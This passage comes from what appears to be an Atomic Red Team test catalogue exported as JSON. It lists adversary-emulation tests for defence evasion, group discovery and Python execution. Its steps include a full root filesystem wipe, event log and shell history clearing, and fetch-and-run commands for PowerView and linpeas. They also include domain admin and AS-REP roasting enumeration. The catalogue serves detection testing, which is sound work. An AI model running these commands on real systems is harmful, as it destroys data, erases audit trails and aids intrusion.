deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | teamviewer_log_file | Teamviewer log file to create and delete. | String | $env:TEMP\\TeamViewer_54.log | "}, "executionSteps": [{"description": "New-Item -Path #{teamviewer_log_file} -Force | Out-Null\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete Prefetch File", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete Filesystem - Linux", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete an entire folder - Windows PowerShell", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | folder_to_delete | Folder to delete. Run the prereq command to create it if it does not exist. | String | $env:TEMP\\deleteme_folder_T1551.004 | "}, "executionSteps": [{"description": "Remove-Item -Path #{folder_to_delete} -Recurse\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete an entire folder - Windows cmd", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | folder_to_delete | Folder to delete. Run the prereq command to create it if it does not exist. | String | %temp%\\deleteme_T1551.004 | "}, "executionSteps": [{"description": "rmdir /s /q #{folder_to_delete}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete an entire folder - Linux/macOS", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Recursively delete the temporary directory and all files contained within it\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | folder_to_delete | Path of folder to delete | Path | /tmp/victim-files | "}, "executionSteps": [{"description": "rm -rf #{folder_to_delete}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete a single file - Windows PowerShell", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_delete | File to delete. Run the prereq command to create it if it does not exist. | String | $env:TEMP\\deleteme_T1551.004 | "}, "executionSteps": [{"description": "Remove-Item -path #{file_to_delete}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete a single file - Windows cmd", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_delete | File to delete. Run the prereq command to create it if it does not exist. | String | %temp%\\deleteme_T1551.004 | "}, "executionSteps": [{"description": "del /f #{file_to_delete}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Delete a single file - Linux/macOS", "shortName": "T1070.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Delete a single file from the temporary directory\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_delete | Path of file to delete | Path | /tmp/victim-files/a | "}, "executionSteps": [{"description": "rm -f #{file_to_delete}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ph03q929mqaegpaar1", "clacwm1vn00en29mqc7ghfngq"], "tags": []}, {"data": {"name": "Use Space Before Command to Avoid Logging to History", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using a space before a command causes the command to not be logged in the Bash History file\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "hostname\nwhoami\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Prevent Powershell History Logging", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Prevents Powershell history\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-PSReadlineOption \u2013HistorySaveStyle SaveNothing\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Disable Bash History Logging with SSH -T", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Powershell History by Deleting History File", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears Powershell history\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Remove-Item (Get-PSReadlineOption).HistorySavePath\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear history of a bunch of shells", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Bash history (truncate)", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears bash history via truncate\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "truncate -s0 ~/.bash_history\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Bash history (rm)", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears bash history via rm\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "rm ~/.bash_history\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Bash history (ln dev/null)", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears bash history via a symlink to /dev/null\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "ln -sf /dev/null ~/.bash_history\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Bash history (echo)", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears bash history via rm\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "echo \"\" > ~/.bash_history\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear Bash history (cat dev/null)", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears bash history via cat /dev/null\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "cat /dev/null > ~/.bash_history\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "Clear and Disable Bash History Logging", "shortName": "T1070.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c\n", "successCriteria": null}], "techniqueIds": ["clacwm60002yr29mq83sa6xp4", "clacwm1g9004l29mqbu7c1o4a"], "tags": []}, {"data": {"name": "rm -rf", "shortName": "T1070.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Delete system and audit logs\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "sudo rm -rf /private/var/log/system.log*\nsudo rm -rf /private/var/audit/*\n", "successCriteria": null}], "techniqueIds": ["clacwm5wd02vf29mq60n773he", "clacwm1gd004n29mq8xbbdtof"], "tags": []}, {"data": {"name": "Overwrite Linux Mail Spool", "shortName": "T1070.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Username of mail spool | String | root | "}, "executionSteps": [{"description": "echo 0> /var/spool/mail/#{username}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wd02vf29mq60n773he", "clacwm1gd004n29mq8xbbdtof"], "tags": []}, {"data": {"name": "Overwrite Linux Log", "shortName": "T1070.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | log_path | Path of specified log | Path | /var/log/secure | "}, "executionSteps": [{"description": "echo 0> #{log_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm5wd02vf29mq60n773he", "clacwm1gd004n29mq8xbbdtof"], "tags": []}, {"data": {"name": "Delete System Logs Using Clear-EventLog", "shortName": "T1070.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n", "successCriteria": null}], "techniqueIds": ["clacwm66x035o29mqdt6fafqx", "clacwm1gg004p29mqafgb4vpz"], "tags": []}, {"data": {"name": "Clear Logs", "shortName": "T1070.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | log_name | Windows Log Name, ex System | String | System | "}, "executionSteps": [{"description": "wevtutil cl #{log_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm66x035o29mqdt6fafqx", "clacwm1gg004p29mqafgb4vpz"], "tags": []}, {"data": {"name": "Clear Event Logs via VBA", "shortName": "T1070.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n", "successCriteria": null}], "techniqueIds": ["clacwm66x035o29mqdt6fafqx", "clacwm1gg004p29mqafgb4vpz"], "tags": []}, {"data": {"name": "Indicator Removal using FSUtil", "shortName": "T1070", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "fsutil usn deletejournal /D C:\n", "successCriteria": null}], "techniqueIds": ["clacwm6ap039n29mqh1l2er8c", "clacwm1yr00gs29mq91ec12o7"], "tags": []}, {"data": {"name": "Permission Groups Discovery PowerShell (Domain)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user | User to identify what groups a user is a member of | String | administrator | "}, "executionSteps": [{"description": "get-ADPrincipalGroupMembership #{user} | select name\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Get-DomainGroupMember with PowerView", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h"], "tags": []}, {"data": {"name": "Get-DomainGroup with PowerView", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h"], "tags": []}, {"data": {"name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h"], "tags": []}, {"data": {"name": "Find machines where user has local admin access (PowerView)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Find Local Admins via Group Policy (PowerView)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | hostname of the computer to analyze | Path | $env:COMPUTERNAME | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Find local admins on all machines in domain (PowerView)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Enumerate Active Directory Groups with Get-AdGroup", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-AdGroup -Filter *\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h"], "tags": []}, {"data": {"name": "Enumerate Active Directory Groups with ADSISearcher", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h"], "tags": []}, {"data": {"name": "Elevated group enumeration using net group (Domain)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net group /domai \"Domain Admins\"\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Basic Permission Groups Discovery Windows (Domain)", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net localgroup\nnet group /domain\nnet group \"domain admins\" /domain\nnet group \"enterprise admins\" /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "Adfind - Query Active Directory Groups", "shortName": "T1069.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -f (objectcategory=group)\n", "successCriteria": null}], "techniqueIds": ["clacwm5vt02v629mqesku036h", "clacwm1pz00az29mq02vr1ixg"], "tags": []}, {"data": {"name": "WMIObject Group Discovery", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-WMIObject Win32_Group\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0"], "tags": []}, {"data": {"name": "Wmic Group Discovery", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic.exe group get name\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0"], "tags": []}, {"data": {"name": "SharpHound3 - LocalAdmin", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | FQDN of the targeted domain | string | $env:UserDnsDomain | \n | sharphound_path | SharpHound Windows executable | path | $env:TEMP\\SharpHound.exe | \n | output_path | Output for SharpHound | path | $env:TEMP\\SharpHound\\ | "}, "executionSteps": [{"description": "New-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0"], "tags": []}, {"data": {"name": "Permission Groups Discovery PowerShell (Local)", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0", "clacwm22h00j929mqhapy7yp1"], "tags": []}, {"data": {"name": "Permission Groups Discovery (Local)", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Permission Groups Discovery\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0", "clacwm22h00j929mqhapy7yp1"], "tags": []}, {"data": {"name": "Basic Permission Groups Discovery Windows (Local)", "shortName": "T1069.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net localgroup\nnet localgroup \"Administrators\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6gc03g129mqcihj0gf0", "clacwm22h00j929mqhapy7yp1"], "tags": []}, {"data": {"name": "Python pty module and spawn function used to spawn sh or bash", "shortName": "T1059.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "which_python=$(which python || which python3 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit", "successCriteria": null}], "techniqueIds": ["clacwm6nc03nx29mqege7crx0"], "tags": []}, {"data": {"name": "Execute shell script via python's command mode arguement", "shortName": "T1059.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_url | Shell script public URL | String | https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh | \n | payload_file_name | Name of shell script downloaded from the script_url | String | T1059.006-payload | \n | executor | Linux shell | String | sh | \n | script_args | Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files. | String | -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles | "}, "executionSteps": [{"description": "which_python=$(which python || which python3 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n", "successCriteria": null}], "techniqueIds": ["clacwm6nc03nx29mqege7crx0"], "tags": []}, {"data": {"name": "Execute Python via scripts (Linux)", "shortName": "T1059.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create Python file (.py) that downloads and executes shell script via executor arguments\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | python_script_name | Python script name | Path | T1059.006.py | \n | script_url | Shell script public URL | String | https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh | \n | payload_file_name | Shell script file name 